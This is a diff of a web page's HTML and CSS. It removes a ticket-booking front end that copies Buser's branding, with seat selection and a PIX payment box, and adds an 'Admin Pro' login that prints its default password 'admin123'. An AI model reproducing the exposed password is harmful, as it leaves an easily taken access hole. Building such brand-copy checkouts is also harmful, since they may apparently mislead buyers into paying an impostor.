-  .ms-background img{width:100%;height:100%;object-fit:cover}
-
-  /* ============================================================
-     BANNERS HOME
-     ============================================================ */
-  .banners-home{display:grid;gap:20px;grid-template-columns:1fr;margin-top:72px}
-  @media (min-width:768px){.banners-home{grid-template-columns:1fr 1fr}}
-  .bh-promo{
-    display:flex;flex-direction:column;gap:24px;align-items:center;
-    background:linear-gradient(135deg,var(--brand-soft) 0%,#fff 100%);
-    border-radius:var(--r-lg);padding:36px;
-    border:1px solid rgba(241,16,117,.12);
-  }
-  @media (min-width:768px){.bh-promo{flex-direction:row;grid-column:1/3;justify-content:space-between}}
-  .bh-promo h1{color:var(--brand);margin:0 0 8px;font-size:24px;line-height:1.25}
-  .bh-promo p{margin:0;color:var(--grey-med)}
-  .bh-promo a{
-    background:linear-gradient(135deg,var(--brand) 0%,var(--brand-dark) 100%);
-    color:#fff;border:none;padding:14px 24px;border-radius:var(--r-md);
-    text-decoration:none;font-weight:600;
-    box-shadow:var(--shadow-brand);transition:var(--t);white-space:nowrap;
-  }
-  .bh-promo a:hover{transform:translateY(-2px);box-shadow:var(--shadow-brand-hover)}
-  .bh-card{
-    display:flex;flex-direction:column;gap:16px;justify-content:space-between;
-    border:1px solid var(--grey-light);border-radius:var(--r-lg);padding:24px;
-    overflow:hidden;transition:var(--t);background:#fff;
-    box-shadow:var(--shadow-xs);
-  }
-  .bh-card:hover{box-shadow:var(--shadow-md);border-color:var(--brand-soft)}
-  @media (min-width:768px){.bh-card{align-items:flex-start;flex-direction:row;gap:24px}}
-  .bh-card h2{margin:0 0 8px;font-size:20px}
-  .bh-card p{margin:0 0 8px;font-size:14px;color:var(--grey-med)}
-  .bh-card .stores{display:flex;flex-direction:column;gap:8px}
-  .bh-card .stores img{width:120px;height:auto;cursor:pointer;transition:var(--t)}
-  .bh-card .stores img:hover{transform:scale(1.04)}
-  .bh-card .img-whats{width:160px;height:100%;object-fit:cover;border-radius:var(--r-md)}
-
-  /* ============================================================
-     DESTINOS
-     ============================================================ */
-  .destinos-procurados{margin-top:72px;padding-top:40px}
-  .destinos-procurados h2{text-align:center;font-size:28px;margin-bottom:36px;color:var(--grey-dark)}
-  .dp-carousel ul{grid-auto-columns:calc(100%/3 - 16px)}
-  @media (max-width:1023px){.dp-carousel ul{grid-auto-columns:calc(100%/2 - 16px)}}
-  @media (max-width:767px){.dp-carousel ul{grid-auto-columns:88%}}
-  .dp-card{
-    border:1px solid var(--grey-light);border-radius:var(--r-lg);
-    padding:24px;margin-bottom:16px;background:#fff;
-    box-shadow:var(--shadow-xs);transition:var(--t);
-  }
-  .dp-card:hover{box-shadow:var(--shadow-md);border-color:var(--brand-soft)}
-  .dp-card h3{margin:0 0 16px;font-size:18px;color:var(--grey-dark)}
-  .dp-card .dp-row{
-    display:flex;justify-content:space-between;margin-bottom:12px;
-    font-size:14px;padding-bottom:10px;border-bottom:1px dashed var(--grey-light);
-  }
-  .dp-card .dp-row:last-of-type{border-bottom:none}
-  .dp-card .dp-row a{color:var(--grey-dark);transition:var(--t)}
-  .dp-card .dp-row a:hover{color:var(--brand)}
-  .dp-card .dp-row span{font-weight:700;color:var(--brand)}
-
-  /* ============================================================
-     SOBRE / VÍDEO
-     ============================================================ */
-  .sobre-buser{margin-top:72px}
-  .ac-titulo{display:flex;flex-direction:column;align-items:center;text-align:center}
-  .ac-titulo h2{font-size:32px;margin:0 0 32px;max-width:600px;line-height:1.25;color:var(--grey-dark)}
-  .sobre-container{
-    width:100%;max-width:700px;height:394px;border-radius:var(--r-lg);
-    overflow:hidden;position:relative;margin:0 auto;
-    box-shadow:var(--shadow-lg);
-  }
-  .sobre-container img{width:100%;height:100%;object-fit:cover;transition:var(--t-slow)}
-  .sobre-container:hover img{transform:scale(1.03)}
-  .sci-btn{
-    position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);
-    width:80px;height:80px;border-radius:50%;
-    background:rgba(255,255,255,.95);
-    display:flex;align-items:center;justify-content:center;
-    color:var(--brand);font-size:26px;cursor:pointer;border:none;
-    box-shadow:0 8px 24px rgba(0,0,0,.25);
-    transition:var(--t);padding-left:6px;
-  }
-  .sci-btn:hover{transform:translate(-50%,-50%) scale(1.1);background:var(--brand);color:#fff}
-  .mpv-motivos{margin-top:56px;display:grid;gap:24px;grid-template-columns:repeat(3,1fr)}
-  @media (max-width:767px){.mpv-motivos{grid-template-columns:1fr}}
-  .mpv-item{text-align:center;padding:8px}
-  .mpv-item .icon{
-    color:var(--brand);font-size:28px;
-    display:inline-flex;align-items:center;justify-content:center;
-    width:56px;height:56px;border-radius:50%;
-    background:var(--brand-soft);margin-bottom:12px;
-  }
-  .mpv-item h3{margin:0 0 6px;font-size:17px;color:var(--grey-dark)}
-  .mpv-item p{margin:0;font-size:14px;color:var(--grey-med)}
-
-  /* ============================================================
-     SEGURANÇA
-     ============================================================ */
-  .seguranca-section{
-    background:
-      radial-gradient(ellipse at 80% 20%,rgba(255,77,154,.25) 0%,transparent 60%),
-      linear-gradient(132deg,var(--brand) 20%,var(--brand-dark) 80%);
-    color:#fff;padding:40px 0;margin-top:72px;border-radius:var(--r-xl);
-    box-shadow:var(--shadow-lg);
-  }
-  .ss-container{display:flex;flex-direction:column;gap:40px;align-items:center;padding-inline:32px}
-  @media (min-width:768px){.ss-container{flex-direction:row;padding-inline:56px}}
-  .ssc-image{width:100%;border-radius:var(--r-md);overflow:hidden;box-shadow:var(--shadow-lg)}
-  .ssc-image img{width:100%;height:100%;object-fit:cover;display:block}
-  .ssc-content h2{font-size:28px;line-height:1.25;margin:0 0 12px}
-  .ssc-content p{margin:0 0 24px;line-height:1.6;opacity:.95}
-  .btn-white{
-    background:#fff;color:var(--brand);padding:14px 24px;border-radius:var(--r-md);
-    font-weight:600;text-decoration:none;
-    display:inline-flex;align-items:center;gap:8px;
-    transition:var(--t);box-shadow:0 4px 12px rgba(0,0,0,.15);
-  }
-  .btn-white:hover{transform:translateY(-2px);box-shadow:0 8px 20px rgba(0,0,0,.2)}
-
-  /* ============================================================
-     FOOTER
-     ============================================================ */
-  .footer{margin-top:72px;padding-bottom:calc(56px + var(--safe-bottom));border-top:1px solid var(--grey-light);background:var(--grey-soft)}
-  .f-social-brand{display:flex;justify-content:space-between;align-items:center;padding:32px 0;flex-wrap:wrap;gap:16px}
-  .fe-social{display:flex;gap:12px;color:var(--grey-dark);font-size:18px}
-  .fe-social span{
-    width:36px;height:36px;display:inline-flex;align-items:center;justify-content:center;
-    border-radius:50%;background:#fff;box-shadow:var(--shadow-xs);
-    cursor:pointer;transition:var(--t);
-  }
-  .fe-social span:hover{background:var(--brand);color:#fff;transform:translateY(-2px)}
-  .ada-divider{height:1px;background:var(--grey-light);display:block;width:100%}
-  .f-links{display:flex;gap:56px;padding:40px 0;flex-wrap:wrap}
-  @media (max-width:767px){.f-links{flex-direction:column;gap:24px}}
-  .f-links > div > span{font-weight:700;display:block;margin-bottom:14px;color:var(--grey-dark);font-size:14px;text-transform:uppercase;letter-spacing:.04em}
-  .f-links a{display:block;font-size:14px;color:var(--grey-med);margin-bottom:10px;transition:var(--t)}
-  .f-links a:hover{color:var(--brand);transform:translateX(2px)}
-  .fe-copyright{padding:24px 0;display:flex;justify-content:center;font-size:12px;color:var(--grey-med);text-align:center}
-
-  /* ============================================================
-     BOTTOM NAV (MOBILE)
-     ============================================================ */
-  .ada-nav-bottom{
-    display:none;position:fixed;bottom:0;left:0;right:0;z-index:25;
-    height:calc(60px + var(--safe-bottom));padding-bottom:var(--safe-bottom);
-    background:rgba(255,255,255,.95);
-    backdrop-filter:saturate(180%) blur(16px);
-    -webkit-backdrop-filter:saturate(180%) blur(16px);
-    box-shadow:0 -1px 0 rgba(0,0,0,.06),0 -4px 12px -8px rgba(0,0,0,.1);
-    justify-content:space-around;align-items:center;
-  }
-  @media (max-width:767px){.ada-nav-bottom{display:flex}}
-  .nb-item{
-    display:flex;flex-direction:column;align-items:center;justify-content:center;
-    color:var(--grey-med);font-size:11px;text-decoration:none;gap:4px;
-    transition:var(--t);padding:6px 12px;border-radius:var(--r-md);position:relative;
-  }
-  .nb-item i{font-size:18px;font-style:normal}
-  .nb-item.active{color:var(--brand)}
-  .nb-item.active::before{
-    content:'';position:absolute;top:-2px;left:50%;transform:translateX(-50%);
-    width:24px;height:3px;border-radius:2px;background:var(--brand);
-  }
-  @media (max-width:767px){body{padding-bottom:calc(60px + var(--safe-bottom))}}
-
-  /* ============================================================
-     MODAIS
-     ============================================================ */
-  #modal-passageiros, #modal-poltrona, #modal-checkout, #modal-passagem {
-    backdrop-filter:blur(6px);
-    -webkit-backdrop-filter:blur(6px);
-    animation:fadeIn .2s var(--ease);
-  }
-  @keyframes fadeIn { from {opacity:0} to {opacity:1} }
-  @keyframes slideUp { from {opacity:0; transform:translateY(16px)} to {opacity:1; transform:translateY(0)} }
-
-  .passageiro-box{
-    background:var(--grey-soft);padding:16px;border-radius:var(--r-md);
-    margin-bottom:16px;border:1px solid var(--grey-light);position:relative;
-    animation:slideUp .25s var(--ease);
-  }
-  .passageiro-box input{
-    width:100%;padding:12px 14px;margin-bottom:8px;
-    border:1.5px solid var(--grey-light);border-radius:var(--r-sm);
-    font-family:'Poppins',sans-serif;font-size:14px;background:#fff;
-    transition:var(--t);outline:none;
-  }
-  .passageiro-box input:focus{border-color:var(--brand);box-shadow:0 0 0 3px var(--brand-soft)}
-  .btn-remover-passageiro{
-    position:absolute;top:12px;right:12px;background:#fff;
-    border:1px solid #ffccd5;color:var(--red);border-radius:6px;
-    padding:4px 10px;font-size:11px;cursor:pointer;font-weight:600;
-    transition:var(--t);
-  }
-  .btn-remover-passageiro:hover{background:#ffe0e5}
-
-  /* Poltronas */
-  .poltrona-btn{
-    width:44px;height:44px;border-radius:8px;border:1.5px solid var(--grey-light);
-    background:#fff;color:var(--grey-dark);font-weight:600;cursor:pointer;
-    transition:var(--t-fast);font-size:13px;
-  }
-  .poltrona-btn:hover:not(:disabled){border-color:var(--brand);transform:scale(1.05)}
-  .poltrona-btn.selecionada{
-    background:linear-gradient(135deg,var(--brand) 0%,var(--brand-dark) 100%);
-    color:#fff;border-color:var(--brand);transform:scale(1.08);
-    box-shadow:var(--shadow-brand);
-  }
-  .poltrona-btn:disabled{background:var(--grey-dark);color:#fff;border-color:var(--grey-dark);cursor:not-allowed}
-  .poltrona-legenda{display:flex;gap:16px;font-size:11px;justify-content:center;margin-bottom:12px;color:var(--grey-med);flex-wrap:wrap}
-  .poltrona-legenda span{display:inline-flex;align-items:center;gap:5px}
-  .poltrona-legenda .sw{display:inline-block;width:14px;height:14px;border-radius:3px;border:1px solid #ddd}
-
-  .bus-map{
-    width:100%;max-width:340px;margin:0 auto 20px;
-    background:var(--grey-soft);border-radius:32px 32px 12px 12px;
-    border:3px solid var(--grey-light);padding:12px 20px 24px;
-  }
-  .bus-windshield{
-    text-align:center;font-size:22px;margin-bottom:16px;
-    padding:8px 12px;background:#d4e8f5;
-    border-radius:20px 20px 6px 6px;border:2px solid #a8c8dd;
-  }
-  .bus-grid{display:flex;flex-direction:column;gap:8px}
-  .bus-row{display:flex;gap:6px;justify-content:center;align-items:center}
-  .bus-aisle{width:20px;height:44px;position:relative;flex-shrink:0}
-  .bus-aisle::before{
-    content:'';position:absolute;left:50%;top:4px;bottom:4px;width:2px;
-    background:repeating-linear-gradient(180deg,#ccc 0,#ccc 4px,transparent 4px,transparent 8px);
-    transform:translateX(-50%);
-  }
-  .bus-placeholder{width:44px;height:44px;flex-shrink:0}
-
-  .buser-modal{
-    background:#fff;border-radius:var(--r-lg);max-width:460px;width:100%;
-    margin:16px;max-height:90vh;overflow-y:auto;
-    box-shadow:var(--shadow-xl);
-    animation:slideUp .3s var(--ease);
-  }
-  .bm-header{
-    background:#fff;padding:18px 16px;border-bottom:1px solid #eee;
-    display:flex;align-items:center;justify-content:center;
-    position:sticky;top:0;z-index:10;
-  }
-  .bm-header h2{margin:0;font-size:18px;font-weight:600}
-  .bm-content{padding:24px}
-
-  /* PIX */
-  .pix-box{text-align:center}
-  .pix-timer{
-    display:inline-block;background:#e3f2fd;color:#0277bd;
-    padding:6px 16px;border-radius:20px;font-size:12px;
-    font-weight:600;margin-bottom:16px;
-  }
-  .pix-total{font-size:24px;font-weight:700;color:#333;margin:10px 0}
-  .pix-btn-copy{
-    width:100%;padding:16px;
-    background:linear-gradient(135deg,var(--brand) 0%,var(--brand-dark) 100%);
-    color:#fff;font-weight:700;font-size:16px;border:none;border-radius:var(--r-md);
-    cursor:pointer;margin:16px 0;
-    display:flex;align-items:center;justify-content:center;gap:8px;
-    box-shadow:var(--shadow-brand);transition:var(--t);
-  }
-  .pix-btn-copy:hover{transform:translateY(-2px);box-shadow:var(--shadow-brand-hover)}
-  #qrcode{display:flex;justify-content:center;margin:16px 0}
-  #qrcode img{border:1px solid #eee;padding:8px;border-radius:var(--r-md)}
-
-  /* Passagem / Voucher Premium */
-  .voucher-card { background: #fff; border-radius: 16px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.1); border: 1px solid #eee; position: relative; margin-bottom: 20px; }
-  .voucher-header { background: linear-gradient(135deg, var(--brand) 0%, var(--brand-dark) 100%); color: #fff; padding: 24px; text-align: center; position: relative; }
-  .voucher-header h2 { margin: 0 0 4px; font-size: 22px; font-weight: 800; }
-  .voucher-header p { margin: 0; font-size: 13px; opacity: 0.9; }
-  .voucher-divider { position: relative; height: 20px; background: #fff; margin: -10px 0; z-index: 2; }
-  .voucher-divider::before, .voucher-divider::after { content: ''; position: absolute; top: 50%; width: 20px; height: 20px; background: var(--bg-body, #f9f9f9); border-radius: 50%; transform: translateY(-50%); box-shadow: inset 0 2px 4px rgba(0,0,0,0.1); }
-  .voucher-divider::before { left: -10px; }
-  .voucher-divider::after { right: -10px; }
-  .voucher-dashed-line { border-top: 2px dashed #ddd; position: absolute; top: 50%; left: 20px; right: 20px; transform: translateY(-50%); z-index: 1; }
-  .voucher-body { padding: 24px; }
-  .voucher-route { display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; }
-  .voucher-route .point { flex: 1; }
-  .voucher-route .point.dest { text-align: right; }
-  .voucher-route .point h3 { margin: 0; font-size: 18px; color: #1a1a1a; line-height: 1.2; }
-  .voucher-route .point p { margin: 4px 0 0; font-size: 13px; color: #757575; font-weight: 600; }
-  .voucher-route .icon { width: 40px; height: 40px; border-radius: 50%; background: var(--brand-soft); color: var(--brand); display: flex; align-items: center; justify-content: center; font-size: 20px; margin: 0 16px; }
-  .voucher-info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 24px; background: #f7f7f7; padding: 16px; border-radius: 12px; }
-  .voucher-info-grid div { display: flex; flex-direction: column; }
-  .voucher-info-grid span { font-size: 11px; color: #757575; text-transform: uppercase; font-weight: 700; letter-spacing: 0.5px; margin-bottom: 4px; }
-  .voucher-info-grid strong { font-size: 15px; color: #1a1a1a; }
-  .voucher-passengers h4 { font-size: 12px; color: #757575; text-transform: uppercase; margin: 0 0 12px; letter-spacing: 0.5px; }
-  .voucher-passenger-item { display: flex; justify-content: space-between; align-items: center; padding: 12px; border-bottom: 1px solid #eee; font-size: 14px; }
-  .voucher-passenger-item:last-child { border-bottom: none; }
-  .voucher-passenger-item .seat { background: var(--brand); color: #fff; font-weight: 800; font-size: 12px; padding: 4px 10px; border-radius: 6px; }
-  .voucher-qr-area { text-align: center; padding: 24px; border-top: 2px dashed #eee; background: #fafafa; }
-  .voucher-qr-area p { font-size: 12px; color: #757575; margin: 8px 0 0; }
-  .voucher-qr-area img { margin: 0 auto; border: 4px solid #fff; box-shadow: 0 4px 12px rgba(0,0,0,0.1); border-radius: 8px; }
-  .btn-maps { display: flex; align-items: center; justify-content: center; gap: 8px; width: 100%; padding: 14px; background: #e8f0fe; color: #1967d2; text-decoration: none; font-weight: 700; font-size: 14px; border-radius: 12px; transition: 0.2s; border: 1px solid #d2e3fc; }
-  .btn-maps:hover { background: #d2e3fc; transform: translateY(-2px); }
-
-  @keyframes spin{to{transform:rotate(360deg)}}
-
-  /* ============================================================
-     BOTÃO FLUTUANTE WHATSAPP
-     ============================================================ */
-  .whatsapp-float{
-    position:fixed;
-    right:20px;
-    bottom:24px;
-    width:60px;
-    height:60px;
-    border-radius:50%;
-    background:linear-gradient(135deg,#25D366 0%,#128C7E 100%);
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    color:#fff;
-    z-index:998;
-    cursor:pointer;
-    border:none;
-    box-shadow:0 8px 24px rgba(37,211,102,.45),0 4px 8px rgba(0,0,0,.15);
-    transition:var(--t);
-    animation:wppPulse 2.4s infinite;
-  }
-  .whatsapp-float:hover{
-    transform:translateY(-3px) scale(1.05);
-    box-shadow:0 12px 32px rgba(37,211,102,.55),0 6px 12px rgba(0,0,0,.2);
-  }
-  .whatsapp-float:active{transform:scale(.95)}
-  .whatsapp-float svg{width:32px;height:32px;fill:currentColor}
-  .whatsapp-float::after{
-    content:'Fale com a gente';
-    position:absolute;
-    right:72px;
-    top:50%;
-    transform:translateY(-50%) translateX(8px);
-    background:#111;
-    color:#fff;
-    padding:8px 14px;
-    border-radius:8px;
-    font-size:12px;
-    font-weight:600;
-    white-space:nowrap;
-    opacity:0;
-    pointer-events:none;
-    transition:var(--t);
-    box-shadow:var(--shadow-md);
-  }
-  .whatsapp-float:hover::after{
-    opacity:1;
-    transform:translateY(-50%) translateX(0);
-  }
-  @keyframes wppPulse{
-    0%{box-shadow:0 8px 24px rgba(37,211,102,.45),0 0 0 0 rgba(37,211,102,.6)}
-    70%{box-shadow:0 8px 24px rgba(37,211,102,.45),0 0 0 16px rgba(37,211,102,0)}
-    100%{box-shadow:0 8px 24px rgba(37,211,102,.45),0 0 0 0 rgba(37,211,102,0)}
-  }
-  @media (max-width:767px){
-    .whatsapp-float{
-      bottom:calc(76px + var(--safe-bottom));
-      right:16px;
-      width:56px;
-      height:56px;
-    }
-    .whatsapp-float svg{width:28px;height:28px}
-    .whatsapp-float::after{display:none}
-  }
-
-  /* ============================================================
-     MOBILE
-     ============================================================ */
-  @media (max-width:767px){
-    .header-hero-text{margin-top:56px;padding-inline:20px}
-    .searchbox-wrapper{margin-top:24px}
-    .searchbox-field{
-      min-width:100%;border-right:none;
-      border-bottom:1px solid var(--grey-light);
-      padding:12px 16px;height:auto;
-    }
-    .searchbox-field:last-of-type{border-bottom:none}
-    .searchbox-btn{
-      width:100%;border-radius:var(--r-md);height:52px;
-      margin:8px 0;min-width:unset;
-    }
-    .swap-btn{display:none}
-    .trip-card{flex-direction:column;align-items:flex-start;gap:12px}
-    .trip-price{text-align:left;width:100%}
-    .trip-price .btn-comprar{width:100%}
-    .buser-modal{margin:0;border-radius:0;max-height:100vh;height:100vh}
-    .hcb-vantagens{flex-wrap:wrap;gap:12px;height:auto}
-    .hcb-vantagens span{font-size:10px}
-    .cupons-carrossel{margin-top:32px}
-    .valores-buser{margin-top:40px;padding:24px 16px}
-    .vb-head h2{font-size:24px}
-    .banners-home{margin-top:32px}
-    .destinos-procurados{margin-top:32px;padding-top:24px}
-    .destinos-procurados h2{font-size:22px}
-    .sobre-buser{margin-top:32px}
-    .sobre-container{height:250px}
-    .ac-titulo h2{font-size:24px}
-    .seguranca-section{margin-top:32px;padding:24px 16px}
-    .ssc-content h2{font-size:22px}
-    .footer{margin-top:32px}
-    .midia-section{margin-top:40px}
-    .ms-content h2{font-size:24px}
-
-    .passageiro-box { padding: 16px 14px 8px; }
-    .passageiro-box input { font-size: 16px; padding: 14px 12px; margin-bottom: 10px; }
-    .btn-remover-passageiro { font-size: 12px; padding: 6px 12px; min-height: 32px; }
-    #modal-passageiros .bm-content > button,
-    #modal-passageiros .bm-content > div:last-child button { min-height: 48px; font-size: 15px; }
-    #modal-passageiros .buser-modal {
-      max-height: 100dvh; height: 100dvh; margin: 0; border-radius: 0;
-      display: flex; flex-direction: column;
-    }
-    #modal-passageiros .bm-content {
-      flex: 1; overflow-y: auto; -webkit-overflow-scrolling: touch;
-      padding: 16px 14px calc(24px + env(safe-area-inset-bottom));
-    }
-  }
+/* IMPRESSÃO */
+@media print {
+  body * { visibility: hidden; }
+  .modal-content, .modal-content * { visibility: visible; color: #000 !important; }
+  .modal-content { position: absolute; left: 0; top: 0; width: 100%; box-shadow: none; border: none; }
+  .modal-head button, .no-print { display: none !important; }
+  .detail-row { border-color: #ccc; }
+  .modal-head { border-bottom: 2px solid #000; }
+}
 </style>
 </head>
 <body>
 
-<nav class="taskbar">
-  <div class="container t-content">
-    <div class="taskbar-desktop">
-      <a href="/" title="Buser">
-        <svg class="logo" viewBox="0 0 122 24" xmlns="http://www.w3.org/2000/svg"><path d="M15.6299 11.9915C14.6646 10.4937 13.7047 9.0067 12.7394 7.51022C12.765 7.48173 12.7892 7.45324 12.8162 7.42746C13.4153 6.84813 14.0817 6.36242 14.8127 5.9649C15.6353 5.51717 16.505 5.19834 17.4204 5.00975C17.9482 4.90121 18.4813 4.83745 19.0198 4.82523C21.3529 4.77368 23.4423 5.46833 25.2571 6.94717C26.8901 8.27678 27.9537 9.98627 28.4814 12.0336C28.6039 12.5071 28.6807 12.9887 28.7265 13.4772C28.7776 14.0253 28.7843 14.5734 28.7386 15.1202C28.5757 17.0549 27.9106 18.7956 26.7084 20.3165C25.4281 21.9351 23.7883 23.0177 21.8133 23.5808C21.3219 23.7205 20.8225 23.8128 20.3149 23.8671C19.7683 23.9268 19.2218 23.9417 18.6738 23.9023C17.1189 23.7897 15.6703 23.3312 14.3415 22.5063C13.1164 21.7465 12.1228 20.7479 11.3393 19.5323C9.38451 16.4959 7.42703 13.4609 5.47089 10.4245C4.11519 8.32698 2.76219 6.22539 1.40649 4.12516C1.1655 3.75205 1.00934 3.3491 0.974333 2.90409C0.921828 2.22572 1.0955 1.60976 1.50746 1.06707C1.91269 0.533871 2.44985 0.20554 3.10683 0.122779C4.19193 -0.0128944 5.0697 0.372419 5.67687 1.29364C6.4806 2.50793 7.25471 3.73849 8.04228 4.95955C9.92706 7.88332 11.8145 10.8071 13.7007 13.7295C14.3509 14.7376 15.0012 15.7443 15.6555 16.7496C16.3259 17.7821 17.2602 18.4469 18.4598 18.6857C19.9393 18.9801 21.2425 18.5853 22.3411 17.5447C23.0209 16.9002 23.4369 16.0984 23.6052 15.1744C24.0293 12.8517 22.5969 10.6646 20.3863 10.1043C19.9016 9.98084 19.4089 9.932 18.9121 9.98627C17.5524 10.1355 16.4753 10.7745 15.6918 11.9088C15.6797 11.9264 15.6689 11.944 15.6568 11.9603C15.6514 11.9671 15.6474 11.9712 15.6299 11.9915Z" fill="currentColor"></path></svg>
-      </a>
-      <div class="menu-links">
-        <a href="/" class="ml-item">Início</a>
-        <a href="/promo" class="ml-item">Promoções</a>
-        <a href="/perfil/viagens" class="ml-item">Viagens</a>
-        <a href="/ajuda" class="ml-item">Ajuda</a>
-        <div class="avatar"></div>
-      </div>
-    </div>
-    <div class="taskbar-mobile">
-      <a href="/" title="Buser">
-        <svg class="logo" viewBox="0 0 122 24" xmlns="http://www.w3.org/2000/svg"><path d="M15.6299 11.9915C14.6646 10.4937 13.7047 9.0067 12.7394 7.51022C12.765 7.48173 12.7892 7.45324 12.8162 7.42746C13.4153 6.84813 14.0817 6.36242 14.8127 5.9649C15.6353 5.51717 16.505 5.19834 17.4204 5.00975C17.9482 4.90121 18.4813 4.83745 19.0198 4.82523C21.3529 4.77368 23.4423 5.46833 25.2571 6.94717C26.8901 8.27678 27.9537 9.98627 28.4814 12.0336C28.6039 12.5071 28.6807 12.9887 28.7265 13.4772C28.7776 14.0253 28.7843 14.5734 28.7386 15.1202C28.5757 17.0549 27.9106 18.7956 26.7084 20.3165C25.4281 21.9351 23.7883 23.0177 21.8133 23.5808C21.3219 23.7205 20.8225 23.8128 20.3149 23.8671C19.7683 23.9268 19.2218 23.9417 18.6738 23.9023C17.1189 23.7897 15.6703 23.3312 14.3415 22.5063C13.1164 21.7465 12.1228 20.7479 11.3393 19.5323C9.38451 16.4959 7.42703 13.4609 5.47089 10.4245C4.11519 8.32698 2.76219 6.22539 1.40649 4.12516C1.1655 3.75205 1.00934 3.3491 0.974333 2.90409C0.921828 2.22572 1.0955 1.60976 1.50746 1.06707C1.91269 0.533871 2.44985 0.20554 3.10683 0.122779C4.19193 -0.0128944 5.0697 0.372419 5.67687 1.29364C6.4806 2.50793 7.25471 3.73849 8.04228 4.95955C9.92706 7.88332 11.8145 10.8071 13.7007 13.7295C14.3509 14.7376 15.0012 15.7443 15.6555 16.7496C16.3259 17.7821 17.2602 18.4469 18.4598 18.6857C19.9393 18.9801 21.2425 18.5853 22.3411 17.5447C23.0209 16.9002 23.4369 16.0984 23.6052 15.1744C24.0293 12.8517 22.5969 10.6646 20.3863 10.1043C19.9016 9.98084 19.4089 9.932 18.9121 9.98627C17.5524 10.1355 16.4753 10.7745 15.6918 11.9088C15.6797 11.9264 15.6689 11.944 15.6568 11.9603C15.6514 11.9671 15.6474 11.9712 15.6299 11.9915Z" fill="currentColor"></path></svg>
-      </a>
-    </div>
-  </div>
-</nav>
-
-<header class="header">
-  <div class="header-bg"></div>
-  <div class="header-gradient"></div>
-  <div class="h-container">
-    <div class="header-hero-text">
-      <h1 class="header-tagline">Sua próxima viagem <span class="tagline-accent">começa aqui</span></h1>
-      <p class="header-subtitle">Passagens de ônibus com até <strong>50% OFF</strong> na Black Friday</p>
-    </div>
-
-    <div class="container searchbox-wrapper">
-      <div class="searchbox-card">
-        <div class="searchbox-field">
-          <label>Origem</label>
-          <input type="text" id="input-origem" placeholder="Cidade de origem" autocomplete="off">
-          <ul id="lista-origem" class="autocomplete-dropdown"></ul>
-        </div>
-        <button class="swap-btn" onclick="swapCidades()">⇅</button>
-        <div class="searchbox-field">
-          <label>Destino</label>
-          <input type="text" id="input-destino" placeholder="Cidade de destino" autocomplete="off">
-          <ul id="lista-destino" class="autocomplete-dropdown"></ul>
-        </div>
-        <div class="searchbox-field">
-          <label>Data de ida</label>
-          <input type="text" id="input-ida" placeholder="Selecione a data" readonly>
-        </div>
-        <button class="searchbox-btn" id="btn-pesquisar" type="button" aria-label="Buscar passagens">
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-            <circle cx="11" cy="11" r="7"></circle>
-            <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
-          </svg>
-          <span>Buscar</span>
-        </button>
-      </div>
-    </div>
-    <div class="hcb-vantagens">
-      <span>✓ Parcelamento em até 12x</span>
-      <span>✓ Cancelamento fácil</span>
-      <span>✓ Embarque com QR Code</span>
-    </div>
-  </div>
-</header>
-
-<div class="container" id="resultados-viagem" style="margin-top:-20px; position:relative; z-index:10;">
-  <h2 id="titulo-resultados">Resultados da busca</h2>
-  <div id="lista-viagens"></div>
-</div>
-
-<div class="container cupons-carrossel">
-  <section class="carousel"><ul>
-    <li><img src="https://images.bcdn.com.br/FzOFcZ_a_eD5HV1Ck4LueOR3dgg=/1920x299/filters:quality(85):format(webp)/https%3A//d1q5r6jf4yxfe1.cloudfront.net/public/banners/2026/11/02/25/hero_desktop_home.png" class="cupom-img" alt="Cupom 1"></li>
-    <li><img src="https://images.bcdn.com.br/S9WY1kN5pYGibytsnJo2RadAmzo=/480x240/filters:quality(85):format(webp)/https%3A//d1q5r6jf4yxfe1.cloudfront.net/public/banners/2026/11/02/23/banner_black_friday.png" class="cupom-img" alt="Cupom 2"></li>
-    <li><img src="https://images.bcdn.com.br/-_h9-QlSqW6HfACE0JvTbhZocnQ=/360x180/filters:quality(85):format(webp)/https%3A//d1q5r6jf4yxfe1.cloudfront.net/public/banners/2026/09/08/23/banners-set-01.png" class="cupom-img" alt="Cupom 3"></li>
-  </ul></section>
-</div>
-
-<div class="container valores-buser">
-  <div class="vb-head"><p>Aqui é sem letras miúdas.</p><h2>É só você vivendo o seu caminho.</h2></div>
-  <div class="vb-cards">
-    <div class="vb-card"><div class="icon-circle">🛡️</div><h3>Mais seguro</h3><p>Empresas e motoristas treinados e certificados pela ANTT. Ônibus com tecnologias exclusivas.</p></div>
-    <div class="vb-card"><div class="icon-circle">✌️</div><h3>Prático como deve ser</h3><p>Viajar com a praticidade de comprar pelo app, sem pegar filas.</p></div>
-    <div class="vb-card"><div class="icon-circle">💰</div><h3>Barato e com qualidade</h3><p>Viagens de ônibus por até menos da metade do preço das passagens de rodoviária.</p></div>
+<div id="login-screen">
+  <div class="login-card">
+    <div class="logo-box">🔐</div>
+    <h1>Painel Admin Pro</h1>
+    <p>Acesso restrito à equipe</p>
+    <input type="password" id="senha-input" placeholder="Digite a senha" autocomplete="current-password">
+    <button onclick="fazerLogin()">Entrar</button>
+    <div class="login-error" id="login-error"></div>
+    <div style="font-size:11px;color:#757575;text-align:center;margin-top:16px">Senha padrão: <strong>admin123</strong></div>
   </div>
 </div>
 
-<div class="container midia-section">
-  <div class="ms-content"><p>Na mídia</p><h2>Veja o que falam sobre a Buser</h2><p>Viajar de Buser é escolher o caminho certo.</p><a href="#">Ver todas as notícias</a></div>
-  <div class="ms-items">
-    <div class="ms-item"><h3>Buser lança rota que vai da capital paulista ao parque de diversões Hopi Hari</h3><div><img src="https://d1q5r6jf4yxfe1.cloudfront.net/public/Imagem/2026/01/13/folha-de-saopaulo.png" alt="Folha"><p>17 de julho de 2025</p></div></div>
-    <div class="ms-item"><h3>Buser investe em praticidade e segurança para ajudar os brasileiros a viajar mais</h3><div><img src="https://d1q5r6jf4yxfe1.cloudfront.net/public/Imagem/2026/01/13/estadao.png" alt="Estadão"><p>21 de maio de 2025</p></div></div>
-  </div>
